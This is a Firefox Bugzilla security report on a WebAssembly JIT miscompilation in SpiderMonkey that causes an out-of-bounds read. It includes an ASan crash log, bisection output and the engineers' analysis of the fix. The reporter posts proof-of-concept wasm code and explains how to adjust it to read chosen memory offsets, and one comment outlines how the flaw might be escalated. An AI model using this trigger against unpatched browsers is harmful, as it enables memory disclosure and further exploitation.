# Security: out-of-bounds access in wasm

Bug URL: https://bugzilla.mozilla.org/show_bug.cgi?id=1889317
Component: JavaScript: WebAssembly
Bounty: (unknown)
Date: 2024-04-03T07:49:18Z
Keywords: csectype-jit, regression, reporter-external, sec-high
See Also:
- https://bugzilla.mozilla.org/show_bug.cgi?id=1892721
- https://bugzilla.mozilla.org/show_bug.cgi?id=1951158

Created attachment 9394699
poc.js

## Reproduce
1. Clone the Firefox mirror from https://github.com/mozilla/gecko-dev
2. Run build command mkdir fuzzbuild_OPT.OBJ && cd fuzzbuild_OPT.OBJ && ../configure --enable-address-sanitizer --disable-jemalloc --enable-debug --enable-optimize --disable-shared-js --enable-application=js --enable-gczeal && make -j64 in the js/src directory of the firefox checkout
3. Run poc: js/src/fuzzbuild_OPT.OBJ/dist/bin/js poc.js

- my test spidermonkey commit hash
```
commit 28cc363411d2029aed04c969c8f98785cae110db (HEAD -> master, origin/master, origin/HEAD)
Author: Norisz Fay <nfay@mozilla.com>
Date:   Thu Mar 28 04:03:07 2024 +0200

    Backed out 2 changesets (bug 1882890) for causing failures on test_printpreview.xhtml CLOSED TREE

    Backed out changeset 08c947500cfc (bug 1882890)
    Backed out changeset 6dfb0be3d0a0 (bug 1882890)
```

## Asan log
```
==2293729==ERROR: AddressSanitizer: SEGV on unknown address 0x0000685eb1d3 (pc 0x2a8d0b22f069 bp 0x7ffc38921a30 sp 0x7ffc389219e0 T0)
==2293729==The signal is caused by a READ memory access.
/home/test/.mozbuild/clang/bin/llvm-symbolizer: error: '[anon:js-executable-memory]': No such file or directory
    #0 0x2a8d0b22f069  ([anon:js-executable-memory]+0x69)
    #1 0x2a8d0b22f79e  ([anon:js-executable-memory]+0x79e)
    #2 0x55bf177421ad in js::wasm::Instance::callExport(JSContext*, unsigned int, JS::CallArgs const&, js::wasm::CoercionLevel) /home/test/gecko-dev/js/src/wasm/WasmInstance.cpp:3205:10
    #3 0x55bf1777de8a in WasmCall(JSContext*, unsigned int, JS::Value*) /home/test/gecko-dev/js/src/wasm/WasmJS.cpp:1856:19
    #4 0x55bf138b77da in CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:479:13
    #5 0x55bf138b5bb3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:573:12
    #6 0x55bf138ea2ed in js::CallFromStack(JSContext*, JS::CallArgs const&, js::CallReason) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:645:10
    #7 0x55bf138ea2ed in js::Interpret(JSContext*, js::RunState&) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:3060:16
    #8 0x55bf138b4289 in MaybeEnterInterpreterTrampoline(JSContext*, js::RunState&) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:393:10
    #9 0x55bf138b3667 in js::RunScript(JSContext*, js::RunState&) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:451:13
    #10 0x55bf138bedd0 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, js::AbstractFramePtr, JS::MutableHandle<JS::Value>) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:838:13
    #11 0x55bf138bfd9d in js::Execute(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>) /home/test/gecko-dev/js/src/vm/Interpreter.cpp:870:10
    #12 0x55bf13dea387 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/test/gecko-dev/js/src/vm/CompilationAndEvaluation.cpp:494:10
    #13 0x55bf13dea9cb in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) /home/test/gecko-dev/js/src/vm/CompilationAndEvaluation.cpp:518:10
    #14 0x55bf137120e2 in RunFile(JSContext*, char const*, _IO_FILE*, CompileUtf8, bool, bool) /home/test/gecko-dev/js/src/shell/js.cpp:1196:10
    #15 0x55bf1370fb02 in Process(JSContext*, char const*, bool, FileKind) /home/test/gecko-dev/js/src/shell/js.cpp:1775:14
    #16 0x55bf135d3d78 in ProcessArgs(JSContext*, js::cli::OptionParser*) /home/test/gecko-dev/js/src/shell/js.cpp:11124:10
    #17 0x55bf135d3d78 in Shell(JSContext*, js::cli::OptionParser*) /home/test/gecko-dev/js/src/shell/js.cpp:11384:12
    #18 0x55bf135c0148 in main /home/test/gecko-dev/js/src/shell/js.cpp:11892:12
    #19 0x7f164a429d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ([anon:js-executable-memory]+0x69)
==2293729==ABORTING
```

## Bisect
```
python3 -m autobisect js poc.js --asan --flags="" --start=2024-03-01
[2024-04-03 15:36:28] Begin bisection...
[2024-04-03 15:36:28] > Start: 7a6867a3eabf3020e0dc11d629d16309150434ed (20240301094944)
[2024-04-03 15:36:28] > End: 52bb75377d06cfb305446ca966c7526c9c9729c7 (20240402213900)
[2024-04-03 15:36:28] Attempting to verify boundaries...
[2024-04-03 15:36:28] Testing build 7a6867a3eabf3020e0dc11d629d16309150434ed (20240301094944)
[2024-04-03 15:36:33] > Verifying build...
[2024-04-03 15:36:33] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-7a6867a3eabf/dist/bin/js -e "quit()"
[2024-04-03 15:36:33] > Launching build with testcase...
[2024-04-03 15:36:33] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-7a6867a3eabf/dist/bin/js /tmp/testjs
[2024-04-03 15:36:33] > Failed to reproduce issue!
[2024-04-03 15:36:33] Testing build 52bb75377d06cfb305446ca966c7526c9c9729c7 (20240402213900)
[2024-04-03 15:36:34] > Downloading: https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/djsEdZWwTRK8-OZmPaOekg/artifacts/public/build/target.jsshell.zip (58.48MiB total)
[2024-04-03 15:37:04] .. still downloading (39.3%, 800.14kB/s)
[2024-04-03 15:37:34] .. still downloading (76.5%, 773.08kB/s)
[2024-04-03 15:37:51] .. downloaded (788.06kB/s)
[2024-04-03 15:37:51] .. extracting
[2024-04-03 15:37:54] Extracted into /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-52bb75377d06
[2024-04-03 15:37:57] > Verifying build...
[2024-04-03 15:37:57] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-52bb75377d06/dist/bin/js -e "quit()"
[2024-04-03 15:37:57] > Launching build with testcase...
[2024-04-03 15:37:57] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-52bb75377d06/dist/bin/js /tmp/testjs
[2024-04-03 15:37:57] Verified supplied boundaries!
[2024-04-03 15:37:57] Attempting to reduce bisection range using taskcluster binaries
[2024-04-03 15:37:57] Enumerating daily builds: 2024-03-02 09:49:44+00:00 - 2024-04-01 21:39:00+00:00
[2024-04-03 15:38:00] Testing build f8012c535035e293e5a1dffee1798ed3b496ff22 (20240317010107)
[2024-04-03 15:38:02] > Verifying build...
[2024-04-03 15:38:02] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-f8012c535035/dist/bin/js -e "quit()"
[2024-04-03 15:38:02] > Launching build with testcase...
[2024-04-03 15:38:02] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-f8012c535035/dist/bin/js /tmp/testjs
[2024-04-03 15:38:02] > Failed to reproduce issue!
[2024-04-03 15:38:05] Testing build 19d905446a32ebc5b281e61c8ee49718ee784a25 (20240325093847)
[2024-04-03 15:38:07] > Verifying build...
[2024-04-03 15:38:07] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-19d905446a32/dist/bin/js -e "quit()"
[2024-04-03 15:38:07] > Launching build with testcase...
[2024-04-03 15:38:07] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-19d905446a32/dist/bin/js /tmp/testjs
[2024-04-03 15:38:11] Testing build ed7ada93d4ad18f5c9f613bf5ce8d5f89bdaa140 (20240321093138)
[2024-04-03 15:38:12] > Verifying build...
[2024-04-03 15:38:12] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-ed7ada93d4ad/dist/bin/js -e "quit()"
[2024-04-03 15:38:12] > Launching build with testcase...
[2024-04-03 15:38:12] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-ed7ada93d4ad/dist/bin/js /tmp/testjs
[2024-04-03 15:38:16] Testing build ca250739126614322a325fededc713174a6ad565 (20240319093523)
[2024-04-03 15:38:18] > Verifying build...
[2024-04-03 15:38:18] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-ca2507391266/dist/bin/js -e "quit()"
[2024-04-03 15:38:18] > Launching build with testcase...
[2024-04-03 15:38:18] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-ca2507391266/dist/bin/js /tmp/testjs
[2024-04-03 15:38:18] > Failed to reproduce issue!
[2024-04-03 15:38:21] Testing build 668e95c16a47b2ed48ba7914ea247b72d7fd3e4f (20240320044834)
[2024-04-03 15:38:23] > Verifying build...
[2024-04-03 15:38:23] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-668e95c16a47/dist/bin/js -e "quit()"
[2024-04-03 15:38:23] > Launching build with testcase...
[2024-04-03 15:38:23] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-668e95c16a47/dist/bin/js /tmp/testjs
[2024-04-03 15:38:23] > Failed to reproduce issue!
[2024-04-03 15:38:23] Enumerating pushdate builds: 2024-03-20 04:48:34+00:00 - 2024-03-21 09:31:38+00:00
[2024-04-03 15:38:43] Testing build 533a3c2e587f7ea99fde847c499dbb77d1d7c623 (20240320211635)
[2024-04-03 15:38:50] > Verifying build...
[2024-04-03 15:38:50] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-533a3c2e587f/dist/bin/js -e "quit()"
[2024-04-03 15:38:50] > Launching build with testcase...
[2024-04-03 15:38:50] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-533a3c2e587f/dist/bin/js /tmp/testjs
[2024-04-03 15:38:50] > Failed to reproduce issue!
[2024-04-03 15:38:50] Testing build 533a3c2e587f7ea99fde847c499dbb77d1d7c623 (20240320211635)
[2024-04-03 15:38:52] > Verifying build...
[2024-04-03 15:38:52] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-533a3c2e587f/dist/bin/js -e "quit()"
[2024-04-03 15:38:52] > Launching build with testcase...
[2024-04-03 15:38:52] Running: /home/test/.cache/autobisect/builds/js-m-c-linux-asan-opt-533a3c2e587f/dist/bin/js /tmp/testjs
[2024-04-03 15:38:53] > Failed to reproduce issue!
[2024-04-03 15:38:53] Enumerating autoland builds: 2024-03-20 21:16:35+00:00 - 2024-03-21 09:31:38+00:00
[2024-04-03 15:38:59] Unable to find build for f515047f59a1a7a86099a69b2f971ceb4b25b917
[2024-04-03 15:39:08] Unable to find build for 3e2f42b1eb5e4685fc3fe0ba3c79f2e39266efe9
[2024-04-03 15:39:13] Unable to find build for 37d6c69ff714f7aca5d5abe75db960b25c48c0d2
[2024-04-03 15:39:15] Unable to find build for 42d629ff04692063f792eacb99fb036e6eec1c21
[2024-04-03 15:39:17] Unable to find build for acf296ab5a514e559e2fef4386c93bc704dbac83
[2024-04-03 15:39:18] Unable to find build for 5129aad8dc2ba788551e65a14fcaa95d8fa2e36f
[2024-04-03 15:39:20] Unable to find build for 3d20ff32b07e3f081122ab4035ce114c1f4e0acd
[2024-04-03 15:39:22] Unable to find build for 4c2515ee7140f88d86461c436fd91dc42bdc1995
[2024-04-03 15:39:24] Unable to find build for 801b0eb7f87f738d7e2339295665bd0024f11891
[2024-04-03 15:39:26] Unable to find build for 9563f82ebd953a33c7323ae9a83488cd0b2685ba
[2024-04-03 15:39:29] Unable to find build for dfd86e34e53f9f59977cda70a90d29f84429bce3
[2024-04-03 15:39:30] Unable to find build for eed1acdcdfbd5e142e91d16ba0a40cd9029fa65d
[2024-04-03 15:39:33] Unable to find build for 87e8d0e769537b174c317b9fb5027545d413ad19
[2024-04-03 15:39:35] Unable to find build for fbcbcefa6e3a10f4b8dc4a0f57ee17ae1153bf95
[2024-04-03 15:39:37] Unable to find build for 4594b4f715011918be50e23fbe836d2657805828
[2024-04-03 15:39:38] Unable to find build for ed014cf848d0b78486a6dc1841b00fcaa597eb9a
[2024-04-03 15:39:40] Unable to find build for 124f8d5bca07abf1a5699aa1cd2b7e43b4d73f52
[2024-04-03 15:39:42] Unable to find build for 8176541e6b164437db0518db624bb09850acc6a5
[2024-04-03 15:39:44] Unable to find build for 5e2a9d5266b3d0e6c124edd473d5d6bbb38ec494
[2024-04-03 15:39:47] Unable to find build for a357e32284a9b599a168a33bc844d7557c53f559
[2024-04-03 15:39:51] Unable to find build for fc9648a468f256e21fc4733a531b2d9b42ff4007
[2024-04-03 15:39:53] Unable to find build for 98c71049a8357ea605aeb9e647b8e53f03e2b417
[2024-04-03 15:39:54] Unable to find build for dabb7983c1c878cb7f2041d87f0f45b351d959e6
[2024-04-03 15:39:58] Unable to find build for 928a3ed4b54c2e18304d925b8b3d1d62dc82cde0
[2024-04-03 15:40:00] Unable to find build for 63ad59ad143dac4c0fa495e812d9c7c4cc8612de
[2024-04-03 15:40:02] Unable to find build for 1627198cca083514f865e6ce13826e5da9eb1de7
[2024-04-03 15:40:05] Unable to find build for cf7afec72efbc5c5c76ca6e47164e1171041f532
[2024-04-03 15:40:06] Unable to find build for 5aab94056467707ddbd9776f0cf4f0725bc7d9a0
[2024-04-03 15:40:10] Unable to find build for 287c10cf1375fa6f54b2703c3103f5401877f614
[2024-04-03 15:40:14] Unable to find build for cc30b271bc5fd232ec4093f86ed91877dbdb72be
[2024-04-03 15:40:16] Unable to find build for f5019c47d0a8b66130b9a320b27e1391ad3a505d
[2024-04-03 15:40:17] Unable to find build for 4e0a26aa5c3f622279641b5ca84d011feae167cc
[2024-04-03 15:40:19] Unable to find build for e15a85fbd4d7260138b11f94f7cdafe2e9fabcdf
[2024-04-03 15:40:21] Unable to find build for 3614bce991ac5c728c64a17f4e1c31d3b2a65407
[2024-04-03 15:40:22] Unable to find build for 0f5d6ecc7a9f21c6f5cd67df90fa552d91e1e062
[2024-04-03 15:40:24] Unable to find build for 2267e7765e87d6e32eb2a98e9476c9181c31d305
[2024-04-03 15:40:26] Unable to find build for 5129e0aba2022deba85656787f7938bb5eb5bc2d
[2024-04-03 15:40:31] Unable to find build for 2885551667c667991987393caf3aa1e15abcf171
[2024-04-03 15:40:33] Unable to find build for 95d4dc214cbe81d42a70361db0b3fab426f9e90e
[2024-04-03 15:40:35] Unable to find build for c0caba9b75e6aa26ce09010da72b6fb3c246bad9
[2024-04-03 15:40:38] Unable to find build for 60bef97b8c8a105ccf9e4b45f261e62150b97a56
[2024-04-03 15:40:40] Unable to find build for 36774fce29dcad81c2faf0b8bcac86dc9ac4fcc0
[2024-04-03 15:40:42] Unable to find build for d92964b8e87dfff54197cf90a0fba7d3abbb88a8
[2024-04-03 15:40:49] Unable to find build for fec85b4e8ea77619495acb0c9df88ac2d067b3f1
[2024-04-03 15:40:52] Unable to find build for 426dcbcf85175809c1c281428a304a49b2c2bfeb
[2024-04-03 15:40:55] Unable to find build for ce3a6cf698ec870d3a8aea756d5da52c6a5cc8ab
[2024-04-03 15:40:57] Unable to find build for 3daba4b6312166a2d6353ab0d7d2de04f9eb99ea
[2024-04-03 15:40:58] Unable to find build for 93dcd5c56c14ac92fb8d59e8bdc751f95594f3f6
[2024-04-03 15:41:00] Unable to find build for deeb4d41a8eda4809ca558fd3a6d6acd2cbaec63
[2024-04-03 15:41:02] Unable to find build for eee295a109f8417422fd901010358e4730e0a6f0
[2024-04-03 15:41:06] Unable to find build for ed1a8619fabd49057c720ee865404972bdbf6cca
[2024-04-03 15:41:09] Unable to find build for 012d9c31e023f72347418ef1f489ef4f3c4eb715
[2024-04-03 15:41:12] Unable to find build for 39a7301123bd50b57f09340876af7c8909078f98
[2024-04-03 15:41:15] Unable to find build for f6e7c628bcc7d028285ff4a39c89f67f748b232a
[2024-04-03 15:41:18] Unable to find build for a75b07e747895593d31adc90a3560bcadf6b72e2
[2024-04-03 15:41:23] Unable to find build for 1c3207a63b6ab853aca3aecd9a42ffa648d06b8d
[2024-04-03 15:41:27] Unable to find build for 206e85bbe0b29fb32717d80d11825aadcb2f9179
[2024-04-03 15:41:31] Unable to find build for c9fc4a8babbe07a2d98d7ae1ede25d4cc492bbc7
[2024-04-03 15:41:38] Unable to find build for f0ec68d6b2a9886b1db2d38a431d9a312993a961
[2024-04-03 15:41:40] Unable to find build for b6608254405d13f4f05abe4b952a43955936a482
[2024-04-03 15:41:42] Unable to find build for 866288a0db9ce4bef2c2390b851be6a24bce09c6
[2024-04-03 15:41:44] Unable to find build for 6e698f8f323a9f6f76fd387f0cadfa5b76539266
[2024-04-03 15:41:46] Unable to find build for 7d8b8ca592a018765f4cf3a6f193065ef256361c
[2024-04-03 15:41:48] Unable to find build for 624214853fa5cdbdba052cfd8675eac46bb98815
[2024-04-03 15:41:50] Unable to find build for b328aa9b6f1e9c39990699f8830421919ecc4d4a
[2024-04-03 15:41:51] Unable to find build for cd273186a92d718f1aed67fb56d8a6a664ca022f
[2024-04-03 15:41:53] Unable to find build for 6467088992450b90a176fbba6ec2c9a41ce8d5b9
[2024-04-03 15:41:55] Unable to find build for 50d4cdecac192c1d8d79d425d76707a90a97a874
[2024-04-03 15:41:57] Unable to find build for b0f251a4bb8f0d9da10442c1cb5d72b177dfd8f9
[2024-04-03 15:41:59] Unable to find build for 07a8dbfb23aef694b9fe0b8167eb4c428f97148c
[2024-04-03 15:42:01] Unable to find build for 82c125858029fb80480502bcd2f2c63c330f8286
[2024-04-03 15:42:08] Unable to find build for 2cc6357f444ed73baf69d86b953ccc8747a69cd8
[2024-04-03 15:42:14] Unable to find build for 4eb8d8364858b2680b21b5ffd3638ca8e8e3b3c1
[2024-04-03 15:42:16] Unable to find build for c77905fb7da0e0069bc64840e80cd4a6b1bdd133
[2024-04-03 15:42:18] Unable to find build for f79bdcabf7ef1a9b78a69fe651620ab6366d2661
[2024-04-03 15:42:20] Unable to find build for 1ce43125d39bf65ae8da49d0fabae1d25a47f84e
[2024-04-03 15:42:22] Unable to find build for 261c811d67c49fe3c626f54b9dfdea35f66b7976
[2024-04-03 15:42:25] Unable to find build for 7cd57b786487d0c0e20eca619adc14778c9203f5
[2024-04-03 15:42:27] Unable to find build for c87d23851930bffe7cdf5e4dcfc3c1db5ce7630f
[2024-04-03 15:42:37] Testing build a54ceb09cf6c6289a4353feb9c3cb771a7651bd0 (20240320190624)
[2024-04-03 15:42:39] > Verifying build...
[2024-04-03 15:42:39] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-a54ceb09cf6c/dist/bin/js -e "quit()"
[2024-04-03 15:42:39] > Launching build with testcase...
[2024-04-03 15:42:39] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-a54ceb09cf6c/dist/bin/js /tmp/testjs
[2024-04-03 15:42:40] > Failed to reproduce issue!
[2024-04-03 15:42:40] Testing build 7e65c2e3fa5893e80c6f6f8ef4deef5861f82edc (20240320213057)
[2024-04-03 15:42:41] > Verifying build...
[2024-04-03 15:42:41] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-7e65c2e3fa58/dist/bin/js -e "quit()"
[2024-04-03 15:42:41] > Launching build with testcase...
[2024-04-03 15:42:41] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-7e65c2e3fa58/dist/bin/js /tmp/testjs
[2024-04-03 15:42:42] > Failed to reproduce issue!
[2024-04-03 15:42:42] Testing build 7bdff141ad24186f89a5466251daf5affc045661 (20240320233816)
[2024-04-03 15:42:43] > Verifying build...
[2024-04-03 15:42:43] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-7bdff141ad24/dist/bin/js -e "quit()"
[2024-04-03 15:42:43] > Launching build with testcase...
[2024-04-03 15:42:43] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-7bdff141ad24/dist/bin/js /tmp/testjs
[2024-04-03 15:42:44] Testing build 1689c0a2164068d719b57035a704319fcd5889a6 (20240320215828)
[2024-04-03 15:42:46] > Verifying build...
[2024-04-03 15:42:46] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-1689c0a21640/dist/bin/js -e "quit()"
[2024-04-03 15:42:46] > Launching build with testcase...
[2024-04-03 15:42:46] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-1689c0a21640/dist/bin/js /tmp/testjs
[2024-04-03 15:42:46] Testing build 41ece3527411c51370d8cd75949433f866ba66b2 (20240320215204)
[2024-04-03 15:42:48] > Verifying build...
[2024-04-03 15:42:48] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-41ece3527411/dist/bin/js -e "quit()"
[2024-04-03 15:42:48] > Launching build with testcase...
[2024-04-03 15:42:48] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-41ece3527411/dist/bin/js /tmp/testjs
[2024-04-03 15:42:49] Testing build 09efcfddf8c840a2b3ca59391ed1d7e150985142 (20240320214557)
[2024-04-03 15:42:51] > Verifying build...
[2024-04-03 15:42:51] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-09efcfddf8c8/dist/bin/js -e "quit()"
[2024-04-03 15:42:51] > Launching build with testcase...
[2024-04-03 15:42:51] Running: /home/test/.cache/autobisect/builds/js-m-a-linux-asan-opt-09efcfddf8c8/dist/bin/js /tmp/testjs
[2024-04-03 15:42:51] > Failed to reproduce issue!
[2024-04-03 15:42:51] Reduced build range to:
[2024-04-03 15:42:51] > Start: 09efcfddf8c840a2b3ca59391ed1d7e150985142 (20240320214557)
[2024-04-03 15:42:51] > End: 41ece3527411c51370d8cd75949433f866ba66b2 (20240320215204)
[2024-04-03 15:42:51] > https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=09efcfddf8c840a2b3ca59391ed1d7e150985142&tochange=41ece3527411c51370d8cd75949433f866ba66b2
[2024-04-03 15:42:51] Bisection completed in: 0:06:22
```

---

**Comment 1 — jdemooij@mozilla.com — 2024-04-03T14:26:31Z**

Hey Ben, the regression range in comment 0 points to bug 1863609.

---

**Comment 2 — eternalsakuraalpha@gmail.com — 2024-04-04T16:39:26Z**

```
var wasm_code = wasmTextToBinary(`
(module
  (type (;0;) (sub (array (mut funcref))))
  (type (;1;) (sub (array (mut i32))))
  (type (;2;) (func))
  (func (;0;) (type 2)
    loop ;; label = @1
      i32.const 0
      ref.i31
      ref.cast anyref
      ref.cast (ref null 1)
      ref.test (ref null 0)
      i64.const 0
      i64.atomic.rmw32.or_u
      i32.const 1
      br_if 0 (;@1;)
      drop
    end
  )
  (memory (;0;) 0 3200)
  (export "main" (func 0))
)
`);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var f = wasm_instance.exports.main;
f();
```
This vulnerability allows for out-of-bounds reading of memory data at the location i32.const multiplied by 2 plus 9.
For example, i32.const 0 can be modified to i32.const 20, which allows reading the data at the location 20*2+9

---

**Comment 3 — eternalsakuraalpha@gmail.com — 2024-04-04T16:41:58Z**

```
var wasm_code = wasmTextToBinary(`
(module
  (type (;0;) (sub (array (mut funcref))))
  (type (;1;) (sub (array (mut i32))))
  (type (;2;) (func))
  (func (;0;) (type 2)
    loop ;; label = @1
      i32.const 0
      ref.i31
      ref.cast anyref
      ref.cast (ref null 1)
      ref.test (ref null 0)
      i64.const 0
      i64.atomic.rmw32.or_u
      i32.const 1
      br_if 0 (;@1;)
      drop
    end
  )
  (memory (;0;) 0 3200)
  (export "main" (func 0))
)
`);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var f = wasm_instance.exports.main;
f();
```
This vulnerability allows for out-of-bounds reading of memory data at the location i32.const multiplied by 2 plus 9.
For example, i32.const 0 can be modified to i32.const 20, which allows reading the data at the location 20*2+9.

---

**Comment 4 — sdetar@mozilla.com — 2024-04-04T17:02:10Z**

Ben, I am assigning this to you for now so you can do the investigation.

---

**Comment 5 — release-mgmt-account-bot@mozilla.tld — 2024-04-04T17:42:34Z**

Set release status flags based on info from the regressing bug 1863609

---

**Comment 6 — bvisness@mozilla.com — 2024-04-08T23:46:08Z**

Created attachment 9395668
Bug 1889317: Disable GVN for wasm subtype checks. r=rhunt

---

**Comment 7 — bvisness@mozilla.com — 2024-04-08T23:58:06Z**

This bug was indeed caused by bug 1863609, which enabled GVN and LICM of `MWasmRefIsSubtypeOf(Abstract|Concrete)`, which is shared by `ref.test` and `ref.cast`. Our codegen for these operations will omit several checks based on the source and destination types from wasm validation, including the check for whether the value is a wasm GC object or some other kind of value. LICM can cause these checks to run too early, before a trap or other runtime effect has actually enforced the type rules from wasm.

This does rather trivially allow for reads of arbitrary memory like the OP describes. Sec-high is accurate for this bug.

---

**Comment 8 — rhunt@eqrion.net — 2024-04-09T16:53:05Z**

To refine the above, while this does allow an arbitrary read of memory, this read is still executed as part of a wasm subtyping check. So the value read from memory needs to also be a pointer and point to something that matches our 'super type vector' structure so that the subtyping check passes instead of failing as we expect. If the attacker can do that, then they have broken the type system and can probably use that for arbitrary reads/writes.

But in order to do all of this, it seems like they need to have leaked an address of memory of some other object in memory that they can then use as input to bypassing the subtyping check using this bug. So this might not be fully exploitable on it's own, but definitely still sec-high.

---

**Comment 9 — pulsebot@bmo.tld — 2024-04-11T16:48:00Z**

Pushed by bvisness@mozilla.com:
https://hg.mozilla.org/integration/autoland/rev/5b59e4e6d452
Disable GVN for wasm subtype checks. r=rhunt

---

**Comment 10 — bvisness@mozilla.com — 2024-04-11T16:55:12Z**

Although there is a soft code freeze in effect, we decided to ship this fix anyway since the regressor is only in nightly so far and the fix is not risky. The fix simply reverts the changes to the wasm subtype check MIR nodes. We'd rather not ship a rather severe bug to beta when the fix is close at hand.

---

**Comment 11 — aryx.bugmail@gmx-topmail.de — 2024-04-11T21:43:45Z**

https://hg.mozilla.org/mozilla-central/rev/5b59e4e6d452

---

**Comment 12 — continuation@gmail.com — 2025-10-02T22:38:38Z**

While the visible consequence of this bug is an out of bounds read, it looks like the origin of it is a miscompilation, so I'm going to change it to csectype-jit.
